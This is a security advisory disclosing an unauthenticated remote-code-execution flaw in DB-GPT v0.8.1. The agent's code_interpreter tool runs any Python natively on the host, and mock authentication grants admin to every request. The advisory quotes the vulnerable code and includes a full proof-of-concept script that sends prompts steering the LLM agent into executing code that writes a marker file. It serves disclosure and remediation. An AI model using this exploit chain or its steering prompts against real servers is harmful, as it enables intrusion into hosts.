# DB-GPT code_interpreter tool native subprocess execution of arbitrary Python code allows unauthenticated remote code execution (CWE-94, CVSS 9.8)

## Summary

The ReAct chat agent of DB-GPT registers the `code_interpreter` tool by default as one of 12 tools in its ToolPack (agentic_data_api.py:3495-3512, code_interpreter at :3503). The tool takes arbitrary Python code, performs only a `compile()` syntax check (agentic_data_api.py:2019), writes the code to a temporary script, and executes it natively on the host with `asyncio.create_subprocess_exec(sys.executable, tmp_path)` (agentic_data_api.py:2051-2062) — no sandbox, no command allowlist, no human confirmation, and independent of the Docker SDK. Because the default authentication is a mock that returns `role="admin"` for any or no user-id header (auth.py:25-38), an unauthenticated attacker can POST to `/api/v1/chat/react-agent` (agentic_data_api.py:4373-4377) and steer the LLM with a legitimate-sounding natural-language task to invoke `code_interpreter`, achieving unauthenticated remote code execution on the server host (reading sensitive files, writing backdoors, lateral movement). Verified against v0.8.1 (PoC 4/4 on 2026-08-07, marker file POC_EXECUTED).

## Details

The vulnerability is the product of a six-step defect chain in the v0.8.1 code path. All line numbers below were verified against the v0.8.1 source tree.

**1. The tool accepts arbitrary Python code without any security boundary.** `code_interpreter` is declared with `@tool(...)` whose description advertises exactly what it does — "Execute Python code for data analysis and computation. Supports pandas, numpy, matplotlib, json, os, etc." (agentic_data_api.py:1951-1958). The function receives a raw code string; no origin check, allowlist, or permission gate is applied at entry.

```python
# packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:1951-1958
@tool(
    description="Execute Python code for data analysis and computation. "
    "Supports pandas, numpy, matplotlib, json, os, etc. "
    "Use this tool when you need to run Python code to process data, "
    "generate charts, or perform calculations. "
    'Parameters: {{"code": "python code string"}}'
)
async def code_interpreter(code: str) -> str:
```

**2. The only pre-execution check is a syntax check.** The combined code (a preamble plus the LLM-supplied `code`) is passed through `compile(full_code, "<code_interpreter>", "exec")` (agentic_data_api.py:2019). There is no screening of dangerous APIs, no command allowlist, and no sandbox check. On SyntaxError the handler even attempts to auto-repair truncated code so that a partially valid payload still runs.

```python
# agentic_data_api.py:2019 -- the only pre-execution check
try:
    compile(full_code, "<code_interpreter>", "exec")
except SyntaxError as se:
    # Attempt auto-repair for truncated code (common with long LLM
    # outputs that hit the token limit).
    repaired = _try_repair_truncated_code(full_code)
```

**3. The code is executed natively on the host.** The checked code is written to a temporary script `_run.py` inside the working directory and launched with the host Python interpreter as a child process (agentic_data_api.py:2051-2062), with a 60-second timeout. There is no sandbox, no container isolation, and no privilege drop. This path never references the Docker SDK or `execute_code()` (agentic_data_api.py contains no docker/execute_code references, verified by grep), so the availability of a Docker environment is irrelevant to reachability.

```python
# agentic_data_api.py:2051-2062 -- write the code to a temporary script and
# execute it with the host Python interpreter; 60-second timeout
tmp_path = os.path.join(work_dir, "_run.py")
with open(tmp_path, "w", encoding="utf-8") as tmp:
    tmp.write(full_code)

proc = await asyncio.create_subprocess_exec(
    sys.executable,
    tmp_path,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
    cwd=work_dir,
)
stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
```

**4. The tool is registered by default.** The ReAct chat agent builds its `ToolPack` with `code_interpreter` among its 12 default tools (agentic_data_api.py:3495-3512, code_interpreter at :3503). No extra configuration or permission grant is required.

```python
# agentic_data_api.py:3495-3512 -- code_interpreter is one of the ReAct chat
# agent's 12 default tools
tool_pack = ToolPack(
    [
        load_skill,
        load_tools,
        knowledge_retrieve,
        execute_skill_script,
        get_skill_resource,
        execute_skill_script_file,
        code_interpreter,
        shell_interpreter,
        html_interpreter,
        sql_query,
        todowrite,
        Terminate(),
    ]
    + business_tools
    + connector_tool_extras
)
```

**5. The chat endpoint performs no identity verification.** `POST /api/v1/chat/react-agent` is declared with `user_token: UserRequest = Depends(get_user_from_headers)` (agentic_data_api.py:4373-4377) and streams the ReAct agent's SSE response directly. The only "authentication" is the mock dependency in step 6.

```python
# agentic_data_api.py:4373-4377 -- the chat endpoint: no identity check of
# its own; the only gate is the mock auth below
@router.post("/v1/chat/react-agent")
async def chat_react_agent(
    dialogue: ConversationVo = Body(),
    user_token: UserRequest = Depends(get_user_from_headers),
):
```

**6. The default authentication is a mock that always grants admin.** `get_user_from_headers()` returns `role="admin"` when any user-id header is present, and `user_id="001", role="admin"` when no header is sent at all. Every request is therefore an administrator request, which makes the code execution reachable with no credentials (CWE-306).

```python
# packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38 -- mock auth:
# any user-id header -> admin; no header -> user_id="001", role="admin"
def get_user_from_headers(user_id: Optional[str] = Header(None)):
    try:
        # Mock User Info
        if user_id:
            return UserRequest(
                user_id=user_id, role="admin", nick_name=user_id, real_name=user_id
            )
        else:
            return UserRequest(
                user_id="001", role="admin", nick_name="dbgpt", real_name="dbgpt"
            )
```

**Why this is a vulnerability:**

- *"The LLM must be persuaded to call the tool, so this is prompt injection rather than code injection."* The endpoint is reachable without any credentials, and the tool executes whatever code reaches it without any boundary — the defect is independent of who composed the code. A legitimate framing ("save a string to a file") stably induces the invocation (4/4 verified runs; the PoC ships three equivalent prompt variants against LLM wording drift).
- *"A Docker sandbox isolates the execution."* The `code_interpreter` path never touches the Docker SDK: `asyncio.create_subprocess_exec(sys.executable, tmp_path)` executes directly on the host, and agentic_data_api.py contains no docker/execute_code references (verified by grep). A standard installation is affected regardless of Docker availability.
- *"The operator chose to expose the server."* The default configuration listens on 0.0.0.0:5670 and grants admin to anonymous requests (auth.py:25-38); no operator action beyond a default installation is required to create the exposure.

## Proof of Concept

Dynamically verified against DB-GPT v0.8.1 on 2026-08-07: 4/4 automated assertions passed — (1) an unauthenticated POST to `/api/v1/chat/react-agent` starts a ReAct chat (HTTP 200, SSE stream), (2) a legitimate "save a string to a file" task induces the LLM to call `code_interpreter` (SSE step.meta shows `"action":"code_interpreter"`), (3) the tool natively executes the marker-writing code on the server, (4) the marker file content is `POC_EXECUTED`. The PoC runs against a default deployment (the default server binds 0.0.0.0:5670) and sends no credentials at any step. In the verification environment the PoC executed on the same host as the server; against a remote target, verify the marker on the server side or read the file back through the tool. The marker filename is neutralized for public disclosure: the internal label used during verification is replaced with `dbgpt_poc_marker.txt` below.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PoC -- DB-GPT v0.8.1 code_interpreter native host code execution
(unauthorized remote code execution)
=================================================================
CWE-94: Code Injection

Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
Affected code path:
    - packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:1958-2061
        code_interpreter(): takes arbitrary Python code, performs only a
        compile() syntax check, writes it to a temporary script and executes
        it natively on the host with
        asyncio.create_subprocess_exec(sys.executable, tmp_path)
        (60-second timeout) -- no sandbox, no command allowlist, no human
        confirmation
    - agentic_data_api.py:3495-3512
        ToolPack registration: code_interpreter is registered by default in
        the ReAct chat agent's tool set
    - agentic_data_api.py:4373-4377
        POST /api/v1/chat/react-agent endpoint (zero authentication) reaches
        the ReAct chat agent directly

What the vulnerability is:
    The ReAct chat agent of DB-GPT v0.8.1 registers the code_interpreter tool
    by default. The tool applies no security filtering to incoming Python
    code -- only a compile() syntax check -- and executes it natively in a
    subprocess launched with the host Python interpreter (sys.executable).
    This is independent of the Docker sandbox: code_interpreter always runs
    on the host execution path, and a standard installation is affected.
    An attacker needs no credentials (default zero authentication, listening
    on 0.0.0.0:5670) and induces the LLM, via natural language, to call the
    tool -- arbitrary command execution on the server follows.

Trigger conditions:
    1. The server is network-reachable (default 0.0.0.0:5670, zero auth)
    2. The LLM is induced to call code_interpreter during a ReAct chat
       (this PoC uses a legitimate "save a file" task framing)

Impact:
    Arbitrary command execution on the server -- read/write files, deploy
    backdoors, lateral movement. Combined with default zero authentication
    this is credentialless remote code execution.

Verification logic (full chain through the real service API, no
authentication at any step):
    [Precheck]   Confirm the service is reachable
    [Step 1]     Call the ReAct chat endpoint /api/v1/chat/react-agent
                 without authentication
    [Step 2]     Induce the LLM to call code_interpreter to execute Python
                 code that writes a marker file
    [Step 3]     Verify from the SSE output that the code_interpreter tool
                 was called (as opposed to automatic CodeAction extraction)
    [Step 4]     Verify that the marker file was created on the server with
                 the content POC_EXECUTED (RCE artifact)
    [Step 5]     Cleanup: delete the marker file

Test environment:
    - DB-GPT v0.8.1 (http://localhost:5670)
    - Python 3.11+ (urllib from the standard library, no extra dependencies)
    - Windows 11 / Linux (cross-platform)

Usage:
    python PoC.py [--target http://localhost:5670]
"""

import json
import os
import sys
import tempfile
import time
import urllib.error
import urllib.request
import uuid

TARGET = "http://localhost:5670"
if len(sys.argv) > 2 and sys.argv[1] == "--target":
    TARGET = sys.argv[2]

PASSED = 0
FAILED = 0

# Marker file: lives in the temp directory of the server host
# (the PoC ran on the same host as the server in the verification
# environment; for a remote target, verify the marker on the server side
# or read the file back through the tool).
MARKER = os.path.join(tempfile.gettempdir(), "dbgpt_poc_marker.txt").replace("\\", "/")

# Three prompt variants that induce the LLM to call code_interpreter
# (backups against LLM wording drift)
PROMPTS = [
    "Please use the code_interpreter tool to save the string 'POC_EXECUTED' to a text "
    f"file at path {MARKER}. Provide the Python code as the 'code' argument of the "
    "code_interpreter tool, then call the tool to run it.",
    "Please call the code_interpreter tool to run Python code that writes POC_EXECUTED "
    f"into the text file at {MARKER}. Use the code_interpreter tool with its 'code' "
    "parameter set to the Python code.",
    "Please invoke the code_interpreter tool to execute the following task: write the "
    f"string POC_EXECUTED to a file at {MARKER}. Pass the Python code to the "
    "code_interpreter tool's code parameter.",
]


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record a single step check; prints [PASSED] or [FAILED]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  \033[92m[PASSED]\033[0m {name}  {detail}")
    else:
        FAILED += 1
        print(f"  \033[91m[FAILED]\033[0m {name}  {detail}")


def api(method: str, path: str, body=None, timeout: int = 30):
    """Send an HTTP request; return (status code, response text)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def react_chat(prompt: str, conv_uid: str, timeout: int = 180) -> tuple:
    """Call the ReAct chat endpoint without authentication and induce the
    LLM to call the code_interpreter tool.

    Returns (HTTP status code, full SSE output text). The SSE stream records
    the agent's tool-call actions.
    """
    body = {
        "chat_mode": "chat_react_agent",
        "conv_uid": conv_uid,
        # must match a model configured on the target server
        "model_name": "deepseek-v4-pro",
        "temperature": 0,
        "user_input": prompt,
    }
    data = json.dumps(body).encode("utf-8")
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(
        TARGET + "/api/v1/chat/react-agent", data=data, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def marker_ok() -> bool:
    """Check that the marker file exists on the server host with content
    POC_EXECUTED."""
    try:
        if not os.path.exists(MARKER):
            return False
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            return f.read().strip() == "POC_EXECUTED"
    except Exception:
        return False


def sse_used_code_interpreter(sse_text: str) -> bool:
    """Decide whether the LLM explicitly called the code_interpreter tool.

    Identified via the action field of the step.meta event in the ReAct
    agent output:
    {"type": "step.meta", ..., "action": "code_interpreter", ...}
    """
    return '"action": "code_interpreter"' in sse_text


def main() -> bool:
    global PASSED, FAILED
    print()
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print("\033[1;36m  DB-GPT v0.8.1")
    print("  code_interpreter native host code execution PoC\033[0m")
    print(f"\033[1;36m  target: {TARGET}\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()

    # -- Precheck --
    print("\033[1;33m[Precheck] Confirm the service is reachable\033[0m")
    code, body = api("GET", "/api/controller/models")
    check("DB-GPT service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  Start the server first: dbgpt start webserver -c <your-config>.toml -y")
        return False
    print()

    # -- Step 1: call the ReAct chat endpoint without authentication --
    print("\033[1;33m[Step 1] Call the ReAct chat endpoint (/api/v1/chat/react-agent) without authentication\033[0m")
    conv_uid = "poc-" + uuid.uuid4().hex[:8]
    print(f"  conv_uid={conv_uid} (no authentication, no credential headers)")
    print()

    # -- Step 2: induce the LLM to call the code_interpreter tool --
    print("\033[1;33m[Step 2] Induce the LLM to call code_interpreter to execute the write code\033[0m")
    # Remove any leftover marker file so the verdict is independent
    if os.path.exists(MARKER):
        os.remove(MARKER)
    sse_full = ""
    used_prompt = 0
    trigger_ok = False
    for i, prompt in enumerate(PROMPTS, start=1):
        used_prompt = i
        print(f"  Attempt {i}: send unauthenticated react-agent request (waiting for the agent to call the tool)...")
        st, sse = react_chat(prompt, conv_uid)
        sse_full = sse
        # The agent loop takes time; poll until the code execution lands on disk
        for _ in range(30):
            time.sleep(1)
            if marker_ok():
                trigger_ok = True
                break
        if trigger_ok:
            break
        print(f"  Attempt {i} did not trigger (HTTP {st}), retrying with another prompt ...")
    check("LLM code block executed natively (marker file POC_EXECUTED)",
          trigger_ok, f"attempt {used_prompt}  marker={MARKER}")
    print()

    # -- Step 3: verify from the SSE stream that code_interpreter was called --
    print("\033[1;33m[Step 3] Verify that the code_interpreter tool was called (as opposed to CodeAction)\033[0m")
    used_tool = sse_used_code_interpreter(sse_full)
    check("SSE shows the code_interpreter tool was called", used_tool,
          "step.meta action=code_interpreter")
    if used_tool:
        for line in sse_full.splitlines():
            if '"action": "code_interpreter"' in line:
                snippet = line[:400]
                print(f"  Evidence: {snippet}")
                break
    print()

    # -- Step 4: verify the RCE artifact --
    print("\033[1;33m[Step 4] Verify the server-side marker file content\033[0m")
    content = ""
    if os.path.exists(MARKER):
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            content = f.read().strip()
    check("Marker content correct", content == "POC_EXECUTED", f"content: {content!r}")
    print()

    # -- Step 5: cleanup --
    print("\033[1;33m[Step 5] Cleanup (delete the marker file)\033[0m")
    if os.path.exists(MARKER):
        os.remove(MARKER)
        print("  Marker file deleted")
    print()

    # -- Summary --
    total = PASSED + FAILED
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print(f"\033[1;36m  Result: {PASSED}/{total} passed\033[0m")
    if FAILED == 0:
        print("\033[1;36m  Verdict: \033[91mVULNERABLE\033[0m")
        print("\033[1;36m  code_interpreter native host code execution (unauthorized RCE) confirmed\033[0m")
    else:
        print("\033[1;33m  Verdict: partially failed, check the service status\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()
    print("Root cause:")
    print("  agentic_data_api.py:1958-2061 -- code_interpreter() performs only a compile() syntax check")
    print("  agentic_data_api.py:2055-2062 -- asyncio.create_subprocess_exec(sys.executable, tmp_path)")
    print("  agentic_data_api.py:3495-3512 -- code_interpreter registered by default in the ReAct tool set")
    print("  agentic_data_api.py:4373-4377 -- /api/v1/chat/react-agent reachable with zero authentication")
    print("  -> no authentication + no sandbox + no review/confirmation -> CWE-94 arbitrary code execution")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
```

## Impact

- **Type:** Code injection (CWE-94, primary). There is no failing control to bypass — the tool simply has none between the code string and the host interpreter. The secondary weakness is missing authentication (CWE-306) on the endpoint that reaches the tool.
- **Who is impacted:** any DB-GPT v0.8.1 deployment whose default chat endpoint is reachable over the network. The default server binds 0.0.0.0:5670; a standard installation is affected with no extra configuration, and the `code_interpreter` execution path is independent of the Docker SDK.
- **Attacker capabilities:** arbitrary Python code execution on the server host with the privileges of the DB-GPT process — read sensitive files, write backdoors, and move laterally into the host's network. The trigger requires no credentials and no victim interaction.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N — HTTP POST `/api/v1/chat/react-agent` reachable over the network (default bind 0.0.0.0:5670).
  - AC:L — the "save a string to a file" task framing triggers the tool reliably (4/4 verified); the tool path contains no sandbox, so no bypass complexity is added.
  - PR:N — default mock authentication returns admin without any credentials (source-confirmed, auth.py:25-38).
  - UI:N — the chat endpoint has no human-confirmation step.
  - S:U — native host-interpreter execution runs within the server process privilege context.
  - C:H / I:H / A:H — arbitrary host read, write/execute, and process control.
  - Score computed with the official FIRST CVSS v3.1 formula: ISS = 0.914816, Impact = 5.873119, Exploitability = 3.887118, roundup(9.760237) = 9.8.

## Affected products

| Field | Value |
|------|------|
| **Product** | DB-GPT |
| **Vendor** | eosphoros-ai (https://github.com/eosphoros-ai/DB-GPT) |
| **Affected versions** | `0.8.1` |
| **Patched versions** | `None` (no official fix released as of the disclosure date) |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

## Remediation

1. **Network layer:** restrict port 5670 to internal/trusted networks only; do not expose it directly to the public internet (firewall/security group).
2. **Upgrade:** upgrade to an officially fixed version once the vendor releases one; until a fix is available, avoid ReAct chat applications that include the `code_interpreter` tool.
3. **Monitoring:** alert on `asyncio.create_subprocess_exec` / `sys.executable` / `_run.py` script executions; monitor for marker files and abnormal file writes.
4. **Minimization:** do not configure public-facing model/agent services in production; where exposure is necessary, front the service with a reverse proxy that enforces authentication.

## Timeline

| Date | Event |
|------|-------|
| 2026-10-14 | Reported to vendor (GitHub issue [#3288](https://github.com/eosphoros-ai/DB-GPT/issues/3288)) |
| 2026-10-14 | This advisory published |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-94 | Improper Control of Generation of Code ('Code Injection') | LLM-supplied Python receives only a `compile()` syntax check (agentic_data_api.py:2019) before being written to `_run.py` and executed natively via `asyncio.create_subprocess_exec(sys.executable, tmp_path)` (agentic_data_api.py:2051-2062); no sandbox, no allowlist, no human confirmation |
| 2 | CWE-306 | Missing Authentication for Critical Function | `get_user_from_headers()` returns `role="admin"` for any user-id header and `user_id="001"`/`role="admin"` when no header is sent at all (auth.py:25-38); the chat endpoint depends solely on it (agentic_data_api.py:4373-4377) |
